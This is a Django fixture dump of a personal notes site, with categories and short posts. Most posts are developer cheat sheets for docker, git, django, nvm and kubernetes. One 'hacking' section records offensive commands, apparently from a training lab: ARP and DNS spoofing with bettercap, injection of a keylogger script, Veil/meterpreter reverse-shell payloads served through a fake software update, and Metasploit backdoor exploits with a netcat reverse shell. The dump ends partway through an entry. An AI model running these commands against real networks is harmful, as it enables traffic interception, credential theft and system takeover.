[
  {
    "model": "sections.category",
    "pk": 1,
    "fields": {
      "name": "CodeHelp",
      "slug": "codehelp",
      "parent": null,
      "created_date": "2023-01-01T20:38:02.461Z",
      "updated_date": "2023-01-01T20:38:02.461Z"
    }
  },
  {
    "model": "sections.category",
    "pk": 2,
    "fields": {
      "name": "docker",
      "slug": "docker",
      "parent": 1,
      "created_date": "2023-01-01T20:38:28.729Z",
      "updated_date": "2023-01-01T20:38:28.729Z"
    }
  },
  {
    "model": "sections.category",
    "pk": 3,
    "fields": {
      "name": "django",
      "slug": "django",
      "parent": 1,
      "created_date": "2023-01-01T20:40:23.618Z",
      "updated_date": "2023-01-01T20:40:23.618Z"
    }
  },
  {
    "model": "sections.category",
    "pk": 4,
    "fields": {
      "name": "git",
      "slug": "git",
      "parent": 1,
      "created_date": "2023-01-01T20:41:00.911Z",
      "updated_date": "2023-01-01T20:41:00.911Z"
    }
  },
  {
    "model": "sections.category",
    "pk": 5,
    "fields": {
      "name": "linox",
      "slug": "linox",
      "parent": 1,
      "created_date": "2023-01-01T20:50:09.229Z",
      "updated_date": "2023-01-01T20:50:09.229Z"
    }
  },
  {
    "model": "sections.category",
    "pk": 6,
    "fields": {
      "name": "internet",
      "slug": "internet",
      "parent": 1,
      "created_date": "2023-01-01T20:52:46.674Z",
      "updated_date": "2023-01-01T20:52:46.674Z"
    }
  },
  {
    "model": "sections.category",
    "pk": 7,
    "fields": {
      "name": "react",
      "slug": "react",
      "parent": 1,
      "created_date": "2023-01-01T21:05:14.272Z",
      "updated_date": "2023-01-01T21:05:14.272Z"
    }
  },
  {
    "model": "sections.category",
    "pk": 8,
    "fields": {
      "name": "redux",
      "slug": "redux",
      "parent": 7,
      "created_date": "2023-01-01T21:05:37.397Z",
      "updated_date": "2023-01-01T21:10:13.656Z"
    }
  },
  {
    "model": "sections.category",
    "pk": 9,
    "fields": {
      "name": "typescript",
      "slug": "typescript",
      "parent": 7,
      "created_date": "2023-01-01T21:10:45.512Z",
      "updated_date": "2023-01-01T21:10:45.512Z"
    }
  },
  {
    "model": "sections.category",
    "pk": 10,
    "fields": {
      "name": "router",
      "slug": "router",
      "parent": 7,
      "created_date": "2023-01-01T21:11:23.619Z",
      "updated_date": "2023-01-01T21:11:23.619Z"
    }
  },
  {
    "model": "sections.category",
    "pk": 11,
    "fields": {
      "name": "hooks",
      "slug": "hooks",
      "parent": 7,
      "created_date": "2023-01-01T21:12:03.985Z",
      "updated_date": "2023-01-01T21:12:03.985Z"
    }
  },
  {
    "model": "sections.category",
    "pk": 12,
    "fields": {
      "name": "hacking",
      "slug": "hacking",
      "parent": null,
      "created_date": "2023-01-01T21:13:43.302Z",
      "updated_date": "2023-01-05T12:44:58.741Z"
    }
  },
  {
    "model": "sections.category",
    "pk": 13,
    "fields": {
      "name": "english",
      "slug": "english",
      "parent": null,
      "created_date": "2023-01-01T21:15:55.752Z",
      "updated_date": "2023-01-01T21:15:55.752Z"
    }
  },
  {
    "model": "sections.category",
    "pk": 14,
    "fields": {
      "name": "vmware",
      "slug": "vmware",
      "parent": 15,
      "created_date": "2023-01-01T21:21:56.476Z",
      "updated_date": "2023-01-01T21:27:05.173Z"
    }
  },
  {
    "model": "sections.category",
    "pk": 15,
    "fields": {
      "name": "virtualisation",
      "slug": "virtualisation",
      "parent": 1,
      "created_date": "2023-01-01T21:26:48.829Z",
      "updated_date": "2023-01-01T21:26:48.829Z"
    }
  },
  {
    "model": "sections.category",
    "pk": 16,
    "fields": {
      "name": "virtualBox",
      "slug": "virtualBox",
      "parent": 15,
      "created_date": "2023-01-01T21:27:59.027Z",
      "updated_date": "2023-01-01T21:27:59.027Z"
    }
  },
  {
    "model": "sections.category",
    "pk": 17,
    "fields": {
      "name": "VS code",
      "slug": "vscode",
      "parent": 1,
      "created_date": "2023-01-01T21:31:12.782Z",
      "updated_date": "2023-01-01T21:31:12.782Z"
    }
  },
  {
    "model": "sections.category",
    "pk": 18,
    "fields": {
      "name": "snippet react",
      "slug": "snippet-react",
      "parent": 17,
      "created_date": "2023-01-01T21:31:49.919Z",
      "updated_date": "2023-01-01T21:31:49.919Z"
    }
  },
  {
    "model": "sections.category",
    "pk": 19,
    "fields": {
      "name": "python",
      "slug": "python",
      "parent": 1,
      "created_date": "2023-01-02T17:10:17.481Z",
      "updated_date": "2023-01-02T17:10:31.010Z"
    }
  },
  {
    "model": "sections.category",
    "pk": 20,
    "fields": {
      "name": "APScheduler",
      "slug": "APScheduler",
      "parent": 19,
      "created_date": "2023-01-02T17:11:26.368Z",
      "updated_date": "2023-01-02T17:11:26.368Z"
    }
  },
  {
    "model": "sections.category",
    "pk": 21,
    "fields": {
      "name": "network",
      "slug": "network",
      "parent": 12,
      "created_date": "2023-01-05T12:46:32.134Z",
      "updated_date": "2023-01-05T12:46:32.134Z"
    }
  },
  {
    "model": "sections.category",
    "pk": 22,
    "fields": {
      "name": "gaining_access",
      "slug": "gaining_access",
      "parent": 12,
      "created_date": "2023-01-05T12:47:34.008Z",
      "updated_date": "2023-01-05T12:47:34.008Z"
    }
  },
  {
    "model": "sections.category",
    "pk": 23,
    "fields": {
      "name": "post_exploitation",
      "slug": "post_exploitation",
      "parent": 12,
      "created_date": "2023-01-05T12:48:58.860Z",
      "updated_date": "2023-01-05T12:48:58.860Z"
    }
  },
  {
    "model": "sections.category",
    "pk": 24,
    "fields": {
      "name": "website_hacking",
      "slug": "website_hacking",
      "parent": 12,
      "created_date": "2023-01-05T13:30:46.702Z",
      "updated_date": "2023-01-05T13:30:46.702Z"
    }
  },
  {
    "model": "sections.category",
    "pk": 25,
    "fields": {
      "name": "pre-connection",
      "slug": "pre-connection",
      "parent": 21,
      "created_date": "2023-01-05T19:45:59.298Z",
      "updated_date": "2023-01-05T19:45:59.298Z"
    }
  },
  {
    "model": "sections.category",
    "pk": 26,
    "fields": {
      "name": "network_access",
      "slug": "network_access",
      "parent": 21,
      "created_date": "2023-01-05T19:53:37.275Z",
      "updated_date": "2023-01-05T19:53:37.275Z"
    }
  },
  {
    "model": "sections.category",
    "pk": 27,
    "fields": {
      "name": "post-connection",
      "slug": "post-connection",
      "parent": 21,
      "created_date": "2023-01-05T19:57:22.819Z",
      "updated_date": "2023-01-05T19:57:22.819Z"
    }
  },
  {
    "model": "sections.category",
    "pk": 28,
    "fields": {
      "name": "server_side_attack",
      "slug": "server_side_attack",
      "parent": 22,
      "created_date": "2023-01-13T22:14:13.484Z",
      "updated_date": "2023-01-13T22:14:13.484Z"
    }
  },
  {
    "model": "sections.category",
    "pk": 29,
    "fields": {
      "name": "client_side_attack",
      "slug": "client_side_attack",
      "parent": 22,
      "created_date": "2023-01-14T20:19:09.117Z",
      "updated_date": "2023-01-14T20:19:09.117Z"
    }
  },
  {
    "model": "sections.category",
    "pk": 30,
    "fields": {
      "name": "JS",
      "slug": "JS",
      "parent": 1,
      "created_date": "2023-01-25T12:52:27.689Z",
      "updated_date": "2023-01-25T12:52:27.690Z"
    }
  },
  {
    "model": "sections.category",
    "pk": 31,
    "fields": {
      "name": "parsing",
      "slug": "parsing",
      "parent": 1,
      "created_date": "2023-02-13T09:53:53.017Z",
      "updated_date": "2023-02-13T09:53:53.017Z"
    }
  },
  {
    "model": "sections.category",
    "pk": 32,
    "fields": {
      "name": "kubernetes",
      "slug": "kubernetes",
      "parent": 1,
      "created_date": "2023-02-19T05:19:39.172Z",
      "updated_date": "2023-02-19T05:19:39.172Z"
    }
  },
  {
    "model": "sections.category",
    "pk": 33,
    "fields": {
      "name": "DoсkerSwarm",
      "slug": "DoсkerSwarm",
      "parent": 1,
      "created_date": "2023-02-24T15:17:50.579Z",
      "updated_date": "2023-02-24T15:17:50.579Z"
    }
  },
  {
    "model": "sections.post",
    "pk": 1,
    "fields": {
      "name": "setup",
      "slug": "7gtddol",
      "description": "setup\nhttps://www.digitalocean.com/community/tutorials/how-to-install-and-use-docker-compose-on-ubuntu-22-04\n```\nmkdir -p ~/.docker/cli-plugins/\ncurl -SL https://github.com/docker/compose/releases/download/v2.15.0/docker-compose-linux-x86_64 -o ~/.docker/cli-plugins/docker-compose\n```\n`chmod +x ~/.docker/cli-plugins/docker-compose`\n`sudo chmod 666 /var/run/docker.sock`\n` sudo systemctl restart docker`\n\ndelete\ncontainer \ndocker ps -a\n\ndocker stop $(docker ps -a -q)\ndocker rm $(docker ps -a -q)\ndocker rmi $(docker images -a -q)\n\n`docker system prune --volumes`",
      "category": 2,
      "created_date": "2023-01-01T20:39:05.251Z",
      "updated_date": "2023-02-12T19:48:22.203Z"
    }
  },
  {
    "model": "sections.post",
    "pk": 2,
    "fields": {
      "name": "start",
      "slug": "yjzbmhz",
      "description": "```\npython3 -m venv venv\nsource venv/bin/activate\npip3 install -r requirements.txt\npip freeze > pip_requirements.txt - all packege project\n```\n```\npython3 manage.py makemigrations\npython3 manage.py migrate\npython3 manage.py makemigrations - table[\"user_profile\"]\npython3 manage.py collectstatic\npython3 manage.py createsuperuser\npython3 manage.py runserver  0.0.0.0:8000 \npython3 manage.py startapp user_profile\n```\n```\ndjango-admin startproject core\npython3 manage.py startapp user_profile\n```",
      "category": 3,
      "created_date": "2023-01-01T20:42:09.409Z",
      "updated_date": "2023-01-01T20:47:54.319Z"
    }
  },
  {
    "model": "sections.post",
    "pk": 3,
    "fields": {
      "name": "base",
      "slug": "sx8bwn3",
      "description": "pwd, sd, ls, echo - теперішня папка\n\techo 'Hello World, coders' > hello_coder.txt\n\txxd -c 1 -b text.txt - 10\n\txxd -c 1 text.txt - 16\n\tascii Code sharm\n\n    sudo kill -9 $(sudo lsof -t -i:9001) kill port\n\n\tmkdir \n\ttouch \n\n\tchmod -R 777 mysite - accept to file in directory\n\n\tgksudo nautilus - запуск ащк фвьшт\n\n\tls /home/atlantida/\n\n\tls -a - приховані файли\n\tls - la\n\n\thistory  - історія команд\n\t!55 - номер команди\n\n\tcp - копiювання\n\trm - видлення\n\n\txxd -p calc.exe calc_dump - file in damp\n\n\txxd -r -p calc_dump.txt calc.exe - damp in file\n\n\tmv exemple ../exemple2 -переміщення файла\n\n\tsudo rm exemple2 -видалити\n\n\trm -r some_folder/ - видали папку\n\n\tCtrl + a - на початок\n\tCtrl + e - на Кінець\n\tCtrl + w - видалення по слову\n\n\tnano hello.txt - тексовий редактор \n\n\tless hello.txt - довгий вивід\n\tcat hello.txt | less - \n\n\thead -n 1 hello.txt - перша строка\n\n\ttail -n 1 hello.txt - кінцева строка\n\n\tgrep -rin --include=\"*.py\" \"возникла ошибка\"\n\n\tgrep -rin --include=\"*.py\" \"возникла ошибка\" /tmp/ - пошук символів в файлах\n\n\twhich pip - where is run file\n\t\n\t///crontab  - linox\n\tsudo usermod -a -G crontab atlantida - додавання  групу крон таб\n\tcrontab -e - запуск\n\n```\nsudo echo \"export PATH=$PAT:/home/dev/kubernetes\" >> /etc/bash.bashrc\n```",
      "category": 5,
      "created_date": "2023-01-01T20:50:12.470Z",
      "updated_date": "2023-02-19T06:01:56.629Z"
    }
  },
  {
    "model": "sections.post",
    "pk": 4,
    "fields": {
      "name": "name",
      "slug": "svdpdia",
      "description": "Інтернет\n\tLAN - локальна мережа\n\tWAN - глобальна мережа\n\n\tTCP/IP\n\n\t1.прикладний - FTP, SMB, HTTP, HTTPS, SSH, DNS\n\t2.транспортний - UDP/TCP\n\t3.мережевий - IP, ipv4, ipv6\n\t4.канальний - Ethernet, port\n\n\tip, NAT;\n\n\tupload text.txt\n\n\tsudo apt install -y telnet\n\n\tURL - https://www.google.com\n\tURI - https://www.google.com/search?q=samcart --#-- sourceid=chrome&ie=UTF-8",
      "category": 6,
      "created_date": "2023-01-01T20:52:49.836Z",
      "updated_date": "2023-01-01T20:53:15.130Z"
    }
  },
  {
    "model": "sections.post",
    "pk": 5,
    "fields": {
      "name": "name",
      "slug": "di2ddn5",
      "description": "Git global setup\ngit config --global user.name \"Дмитро Соловка\"\ngit config --global user.email \"dmytro.solovka@gmail.com\"\nCreate a new repository\ngit clone git@gitlab.com:dmytro.solovka/test_commit_from_pycharm.git\ncd test_commit_from_pycharm\ngit switch -c main\ntouch README.md\ngit add README.md\ngit commit -m \"add README\"\ngit push -u origin main\nPush an existing folder\ncd existing_folder\ngit init --initial-branch=main\ngit remote add origin git@gitlab.com:dmytro.solovka/test_commit_from_pycharm.git\ngit add .\ngit commit -m \"Initial commit\"\ngit push -u origin main\nPush an existing Git repository\ncd existing_repo\ngit remote rename origin old-origin\ngit remote add origin git@gitlab.com:dmytro.solovka/test_commit_from_pycharm.git\ngit push -u origin --all\ngit push -u origin --tags\n\n\n\ngit clone git@gitlab.com:dmytro.solovka/first_test.git\n\n\ngit config --global user.name \"SD\"\n\n ssh-keygen\n ls ~/.ssh/\n cat ~/.ssh/id_rsa.pub\n\n\ngit init - initialition\ngit status\ngit add server.py\ngit commit -m \"init first file\"\n \ngit diff - перевырка змін\n\n\ngit remote add origin https://gitlab.com/dmytro.solovka/web.git\ngit remote -v - ...",
      "category": 4,
      "created_date": "2023-01-01T20:57:27.266Z",
      "updated_date": "2023-01-01T20:57:46.784Z"
    }
  },
  {
    "model": "sections.post",
    "pk": 6,
    "fields": {
      "name": "ssh",
      "slug": "so35h7p",
      "description": "convert - sudo puttygen second_app.ppk -O private-openssh -o second_app.pem\nssh conect - sudo ssh -i \"second_app.pem\" ubuntu@ec2-3-213-19-190.compute-1.amazonaws.com\n\nssh-keygen -t rsa -C \"devdjangoreact@gmail.com\"\n\nadduser dev\nadduser dev sudo\n\nAllowUsers dev\n\nsudo service ssh restart\nsudo nano /etc/ssh/ssh_config\n\nhttps://www.digitalocean.com/community/tutorials/how-to-set-up-ssh-keys-on-ubuntu-20-04\ncat ~/.ssh/id_rsa.pub\n\nPasswordAuthentication no\nPermitRootLogin no\nAllowUsers dev",
      "category": 5,
      "created_date": "2023-01-01T20:59:26.614Z",
      "updated_date": "2023-02-24T15:14:27.926Z"
    }
  },
  {
    "model": "sections.post",
    "pk": 7,
    "fields": {
      "name": "base",
      "slug": "8or3szl",
      "description": "imp→\timport moduleName from 'module'\nimn→\timport 'module'\nimd→\timport { destructuredModule } from 'module'\nime→\timport * as alias from 'module'\nima→\timport { originalName as aliasName} from 'module'\nexp→\texport default moduleName\nexd→\texport { destructuredModule } from 'module'\nexa→\texport { originalName as aliasName} from 'module'\nenf→\texport const functionName = (params) => { }\nedf→\texport default (params) => { }\nednf→\texport default function functionName(params) { }\nmet→\tmethodName = (params) => { }\nfre→\tarrayName.forEach(element => { }\nfof→\tfor(let itemName of objectName { }\nfin→\tfor(let itemName in objectName { }\nanfn→\t(params) => { }\nnfn→\tconst functionName = (params) => { }\ndob→\tconst {propName} = objectToDescruct\ndar→\tconst [propName] = arrayToDescruct\nsti→\tsetInterval(() => { }, intervalTime\nsto→\tsetTimeout(() => { }, delayTime\nprom→\treturn new Promise((resolve, reject) => { }\ncmmb→\tcomment block\ncp→\tconst { } = this.props\ncs→\tconst { } = this.state",
      "category": 18,
      "created_date": "2023-01-01T21:31:54.145Z",
      "updated_date": "2023-01-01T21:34:25.983Z"
    }
  },
  {
    "model": "sections.post",
    "pk": 8,
    "fields": {
      "name": "react",
      "slug": "ga3s1tl",
      "description": "imr→\timport React from 'react'\nimrd→\timport ReactDOM from 'react-dom'\nimrc→\timport React, { Component } from 'react'\nimrpc→\timport React, { PureComponent } from 'react'\nimrm→\timport React, { memo } from 'react'\nimrr→\timport { BrowserRouter as Router, Route, NavLink} from 'react-router-dom'\nimbr→\timport { BrowserRouter as Router} from 'react-router-dom'\nimbrc→\timport { Route, Switch, NavLink, Link } from react-router-dom'\nimbrr→\timport { Route } from 'react-router-dom'\nimbrs→\timport { Switch } from 'react-router-dom'\nimbrl→\timport { Link } from 'react-router-dom'\nimbrnl→\timport { NavLink } from 'react-router-dom'\nimrs→\timport React, { useState } from 'react'\nimrse→\timport React, { useState, useEffect } from 'react'\nredux→\timport { connect } from 'react-redux'\nest→\tthis.state = { }\ncdm→\tcomponentDidMount = () => { }\nscu→\tshouldComponentUpdate = (nextProps, nextState) => { }\ncdup→\tcomponentDidUpdate = (prevProps, prevState) => { }\ncwun→\tcomponentWillUnmount = () => { }\ngdsfp→\tstatic getDerivedStateFromProps(nextProps, prevState) { }\ngsbu→\tgetSnapshotBeforeUpdate = (prevProps, prevState) => { }\nsst→\tthis.setState({ })\nssf→\tthis.setState((state, props) => return { })\nprops→\tthis.props.propName\nstate→\tthis.state.stateName\nrcontext→\tconst $1 = React.createContext()\ncref→\tthis.$1Ref = React.createRef()\nfref→\tconst ref = React.createRef()\nbnd→\tthis.methodName = this.methodName.bind(this)",
      "category": 18,
      "created_date": "2023-01-01T21:34:36.636Z",
      "updated_date": "2023-01-01T21:34:56.804Z"
    }
  },
  {
    "model": "sections.post",
    "pk": 9,
    "fields": {
      "name": "django-docker",
      "slug": "5ayjjx4",
      "description": "docker compose exec web python manage.py migrate --noinput\ndocker compose exec web python manage.py dbrestore\ndocker compose exec web python manage.py makemigrations\ndocker compose exec web python manage.py migrate\ndocker compose exec web python manage.py createsuperuser\n\ndocker compose exec web python manage.py flush\ndocker compose exec web python manage.py loaddata movies.json\n\ndocker compose exec web python manage.py collectstatic",
      "category": 3,
      "created_date": "2023-01-02T16:42:11.253Z",
      "updated_date": "2023-01-03T15:58:10.219Z"
    }
  },
  {
    "model": "sections.post",
    "pk": 10,
    "fields": {
      "name": "backup_postgres",
      "slug": "k0benky",
      "description": "```\n  docker exec -t django-on-docker-letsencrypt-db-1 pg_dumpall -c -U core_django > dump_`date +%d-%m-%Y\"_\"%H_%M_%S`.sql\n  cat dump_02-01-2023_16_18_06.sql | docker exec -i django-on-docker-letsencrypt-db-1 psql -U core_django -d core_django_dev\n```",
      "category": 2,
      "created_date": "2023-01-02T16:47:13.090Z",
      "updated_date": "2023-01-02T18:55:11.650Z"
    }
  },
  {
    "model": "sections.post",
    "pk": 11,
    "fields": {
      "name": "name",
      "slug": "f2e3xa3",
      "description": "description",
      "category": 20,
      "created_date": "2023-01-02T17:11:31.969Z",
      "updated_date": "2023-01-02T17:11:31.969Z"
    }
  },
  {
    "model": "sections.post",
    "pk": 12,
    "fields": {
      "name": "APScheduler",
      "slug": "APScheduler",
      "description": "apps.py\n\n```\nfrom django.apps import AppConfig\n\nclass WeatherConfig(AppConfig):\n    name = 'weather'\n\n    def ready(self):\n        from forecastUpdater import updater\n        updater.start()\n```\nupdater\n```\nfrom datetime import datetime\nfrom apscheduler.schedulers.background import BackgroundScheduler\nfrom forecastUpdater import forecastApi\n\ndef start():\n    scheduler = BackgroundScheduler()\n    scheduler.add_job(forecastApi.update_forecast, 'interval', minutes=5)\n    scheduler.start()\n```",
      "category": 3,
      "created_date": "2023-01-02T17:11:46.731Z",
      "updated_date": "2023-01-03T10:24:07.735Z"
    }
  },
  {
    "model": "sections.post",
    "pk": 13,
    "fields": {
      "name": "backupdb",
      "slug": "gvwcwma",
      "description": "https://www.youtube.com/watch?v=s54HYoJ8wrs\n\nhttps://django-dbbackup.readthedocs.io/en/master/installation.html",
      "category": 3,
      "created_date": "2023-01-03T00:29:38.955Z",
      "updated_date": "2023-01-03T10:26:07.640Z"
    }
  },
  {
    "model": "sections.post",
    "pk": 14,
    "fields": {
      "name": "basic",
      "slug": "cxzv2u5",
      "description": "`netdiscover -r 192.168.57.1/24`\n`zanmap`\n`arpspoof -i eth0 -t 192.168.248.2 192.168.248.129`\n`arpspoof -i eth0 -t 192.168.248.129 192.168.248.2`\n`echo 1 > /proc/sys/net/ipv4/ip_forward`",
      "category": 27,
      "created_date": "2023-01-05T20:00:16.030Z",
      "updated_date": "2023-01-05T23:22:03.039Z"
    }
  },
  {
    "model": "sections.post",
    "pk": 16,
    "fields": {
      "name": "bettercap",
      "slug": "vw1xtgs",
      "description": "`bettercap -iface eth0`\n`bettercap -iface eth0 -caplet spoof.cap`\n\n`net.probe on`\n`net.recon on`\n`set arp.spoof.fullduplex true`\n`set arp.spoof.targets 192.168.248.129`\n`arp.spoof on`\n`set net.sneef.local true`\n`net.sniff on`",
      "category": 27,
      "created_date": "2023-01-05T21:40:32.105Z",
      "updated_date": "2023-01-05T23:21:51.122Z"
    }
  },
  {
    "model": "sections.post",
    "pk": 17,
    "fields": {
      "name": "dns.spoof",
      "slug": "2ntsx55",
      "description": "`set dns.spoof.all true`\n`set dns.spoof.domains zsecurity.org,*.zsecurity.org`\n`dns.spoof on`",
      "category": 27,
      "created_date": "2023-01-06T15:54:56.569Z",
      "updated_date": "2023-01-06T15:57:17.931Z"
    }
  },
  {
    "model": "sections.post",
    "pk": 18,
    "fields": {
      "name": "code.injection",
      "slug": "nmqhvss",
      "description": "set hstshijack.payloads        *:/usr/local/share/bettercap/caplets/hstshijack/payloads/keylogger.js,*:`/root/alert.js` - script in /usr/local/share/bettercap/caplets/hstshijack",
      "category": 27,
      "created_date": "2023-01-06T15:57:25.584Z",
      "updated_date": "2023-01-06T16:04:12.861Z"
    }
  },
  {
    "model": "sections.post",
    "pk": 19,
    "fields": {
      "name": "web.interface",
      "slug": "xrxc93x",
      "description": "```\nui.update\nhttp.ui\n```",
      "category": 27,
      "created_date": "2023-01-06T16:05:29.693Z",
      "updated_date": "2023-01-06T16:25:09.817Z"
    }
  },
  {
    "model": "sections.post",
    "pk": 20,
    "fields": {
      "name": "wireshark",
      "slug": "gatmgx7",
      "description": "description",
      "category": 27,
      "created_date": "2023-01-06T16:25:15.090Z",
      "updated_date": "2023-01-06T16:52:21.647Z"
    }
  },
  {
    "model": "sections.post",
    "pk": 21,
    "fields": {
      "name": "fake_access_point",
      "slug": "unw4xkh",
      "description": "description",
      "category": 27,
      "created_date": "2023-01-06T16:52:24.063Z",
      "updated_date": "2023-01-06T16:54:38.844Z"
    }
  },
  {
    "model": "sections.post",
    "pk": 22,
    "fields": {
      "name": "nodejs",
      "slug": "s2oo5jx",
      "description": "`curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.1/install.sh | bash`\n`source ~/.bashrc`\n`nvm list-remote`\n`nvm install v{version}`",
      "category": 5,
      "created_date": "2023-01-11T13:30:08.402Z",
      "updated_date": "2023-01-11T13:31:44.512Z"
    }
  },
  {
    "model": "sections.post",
    "pk": 24,
    "fields": {
      "name": "name",
      "slug": "miu276c",
      "description": "`npx create-react-app frontend --template typescript`",
      "category": 9,
      "created_date": "2023-01-11T21:52:11.666Z",
      "updated_date": "2023-01-29T07:30:55.935Z"
    }
  },
  {
    "model": "sections.post",
    "pk": 25,
    "fields": {
      "name": "name",
      "slug": "pjryb0o",
      "description": "`yarn cache clean`",
      "category": 7,
      "created_date": "2023-01-11T23:37:47.171Z",
      "updated_date": "2023-01-11T23:40:48.739Z"
    }
  },
  {
    "model": "sections.post",
    "pk": 26,
    "fields": {
      "name": "metasploitable",
      "slug": "etrp7k4",
      "description": "login:msfadmin\npassword:msfadmin",
      "category": 22,
      "created_date": "2023-01-13T22:14:23.179Z",
      "updated_date": "2023-01-13T22:18:56.455Z"
    }
  },
  {
    "model": "sections.post",
    "pk": 27,
    "fields": {
      "name": "veil",
      "slug": "hb0vre7",
      "description": "https://github.com/Veil-Framework/Veil\n\nuse 1-list-use 15- set LHOST/RHOST- generate\n\nmsf6 - LHOST/LPORT-set PAYLOAD windows/meterpreter/reverse_https-exploit\n> evilgrade -- fike update windows 10\n`/opt/evilgrade/`\n`configure dap`\n`show options`\n`set agent /var/www/html/eveil/rev_https_8080.exe` `set endsite www.speedbit.com` `start`\n`set dns.spoof.all true` `set dns.spoof.domains update.speedbit.com` `dns.spoof on`",
      "category": 29,
      "created_date": "2023-01-14T20:19:17.235Z",
      "updated_date": "2023-01-16T17:11:16.869Z"
    }
  },
  {
    "model": "sections.post",
    "pk": 28,
    "fields": {
      "name": "TheFatRat",
      "slug": "tmqhw48",
      "description": "https://github.com/screetsec/TheFatRat",
      "category": 29,
      "created_date": "2023-01-14T20:22:01.662Z",
      "updated_date": "2023-01-14T20:22:17.388Z"
    }
  },
  {
    "model": "sections.post",
    "pk": 29,
    "fields": {
      "name": "Empire",
      "slug": "l90ngna",
      "description": "https://github.com/EmpireProject/Empire",
      "category": 29,
      "created_date": "2023-01-14T20:26:30.610Z",
      "updated_date": "2023-01-16T13:04:05.234Z"
    }
  },
  {
    "model": "sections.post",
    "pk": 30,
    "fields": {
      "name": "netkit-rsh",
      "slug": "o2ttlcv",
      "description": "`rlogin -l root 192.168.248.130`",
      "category": 28,
      "created_date": "2023-01-16T12:13:38.824Z",
      "updated_date": "2023-01-16T12:31:46.716Z"
    }
  },
  {
    "model": "sections.post",
    "pk": 31,
    "fields": {
      "name": "msfconsole",
      "slug": "jwrditg",
      "description": "`msfconsole`\n`use exploit/unix/ftp/vsftpd_234_backdoor`\n`show options`\n`set RhOSTS 192.168.248.130`\n`exploit `\n139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\n`use exploit/multi/samba/usermap_script`\n`set payload cmd/unix/reverse_netcat`\n`exploit `",
      "category": 28,
      "created_date": "2023-01-16T12:34:34.882Z",
      "updated_date": "2023-01-16T12:56:07.757Z"
    }
  },
  {
    "model": "sections.post",
    "pk": 32,
    "fields": {
      "name": "maltego",
      "slug": "972tpkc",
      "description": "description",
      "category": 22,
      "created_date": "2023-01-16T13:04:41.072Z",
      "updated_date": "2023-01-16T13:04:53.525Z"
    }
  },
  {
    "model": "sections.post",
    "pk": 33,
    "fields": {
      "name": "python version",
      "slug": "fsjgx3z",
      "description": "ls /usr/bin/python* - check python version\nhttps://www.how2shout.com/linux/install-python-3-9-or-3-8-on-ubuntu-22-04-lts-jammy-jellyfish/",
      "category": 19,
      "created_date": "2023-01-21T20:40:32.496Z",
      "updated_date": "2023-01-21T20:56:25.853Z"
    }
  },
  {
    "model": "sections.post",
    "pk": 34,
    "fields": {
      "name": "name",
      "slug": "k1u7g1e",
      "description": "`curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.35.3/install.sh`\n`curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.35.3/install.sh | bash`\n`source ~/.bashrc`\n`nvm list-remote`\n\n`nvm install v16.19.0`\n`nvm use v16.19.0`",
      "category": 30,
      "created_date": "2023-01-25T12:52:31.401Z",
      "updated_date": "2023-01-26T01:28:36.406Z"
    }
  },
  {
    "model": "sections.post",
    "pk": 35,
    "fields": {
      "name": "portainer",
      "slug": "hvti8la",
      "description": "```\ndocker volume create portainer_data\n```\n\n```\ndocker run -d -p 8888:8000 -p 9000:9000 --name=portainer --restart=always -v /var/run/docker.sock:/var/run/docker.sock -v portainer_data:/data portainer/portainer-ce:2.9.3\n```\n\nhttps://techdirectarchive.com/2022/07/24/how-to-install-docker-portainer-on-linux/",
      "category": 2,
      "created_date": "2023-02-12T11:45:13.392Z",
      "updated_date": "2023-02-13T09:49:48.271Z"
    }
  },
  {
    "model": "sections.post",
    "pk": 36,
    "fields": {
      "name": "splash",
      "slug": "r7l5om6",
      "description": "`sudo docker run -it -p 8050:8050 --rm scrapinghub/splash`",
      "category": 31,
      "created_date": "2023-02-13T09:53:56.566Z",
      "updated_date": "2023-02-13T09:54:14.414Z"
    }
  },
  {
    "model": "sections.post",
    "pk": 37,
    "fields": {
      "name": "scrapy-splash",
      "slug": "avb863c",
      "description": "`pip install scrapy-splash`\nhttps://scrapeops.io/python-scrapy-playbook/scrapy-splash/",
      "category": 31,
      "created_date": "2023-02-13T09:54:55.326Z",
      "updated_date": "2023-02-13T09:55:35.702Z"
    }
  },
  {
    "model": "sections.post",
    "pk": 38,
    "fields": {
      "name": "name",
      "slug": "zghwpb7",
      "description": "description",
      "category": 31,
      "created_date": "2023-02-13T09:54:56.508Z",
      "updated_date": "2023-02-13T09:54:56.508Z"
    }
  },
  {
    "model": "sections.post",
    "pk": 40,
    "fields": {
      "name": "runbackround",
      "slug": "jhijprw",
      "description": "nohup python test.py &",
      "category": 5,
      "created_date": "2023-02-17T20:02:03.794Z",
      "updated_date": "2023-02-17T20:02:30.237Z"
    }
  },
  {
    "model": "sections.post",
    "pk": 41,
    "fields": {
      "name": "forse_push",
      "slug": "d96umfg",
      "description": "Remove the specific commit-id:\n\ngit rebase --onto commit-id^ commit-id\nand then forcibly push to GitHub:\n\ngit push --force-with-lease\n\nssh-keygen -t rsa -C \"devdjangoreact@gmail.com\"",
      "category": 4,
      "created_date": "2023-02-17T20:04:22.298Z",
      "updated_date": "2023-02-17T20:04:45.970Z"
    }
  },
  {
    "model": "sections.post",
    "pk": 42,
    "fields": {
      "name": "virtualBox",
      "slug": "a5gsl8s",
      "description": "minikube - https://github.com/kubernetes/minikube/releases/tag/v1.29.0\nkubectl - \n```\nminikube start\nminikube start -p my_cluster\n\nminikube start --cpus=4 --memory=8gb --disk-size=25gb\nminikube stop\nminikube delete\nminikube ssh\n\nkubectl get componentstatuses\nkubectl cluster-info\nkubectl get nodes\n\nlogin - root\n\ndocker\ntcuser\n\n```",
      "category": 32,
      "created_date": "2023-02-19T05:19:43.259Z",
      "updated_date": "2023-02-19T05:41:15.959Z"
    }
  },
  {
    "model": "sections.post",
    "pk": 43,
    "fields": {
      "name": "eksctl",
      "slug": "ggcjcf9",
      "description": "eksctl \n\n```\neksctl version\neksctl create cluster\neksctl delete cluster \n\neksctl create cluster -f mycluster.yaml\neksctl delete cluster -f mycluster.yaml\n\nkubectl version\nkubectl version --client\nkubectl cluster-info\nkubectl get nodes\n```",
      "category": 32,
      "created_date": "2023-02-19T05:41:17.836Z",
      "updated_date": "2023-02-19T06:15:42.403Z"
    }
  },
  {
    "model": "sections.post",
    "pk": 44,
    "fields": {
      "name": "minikube",
      "slug": "6g3sjos",
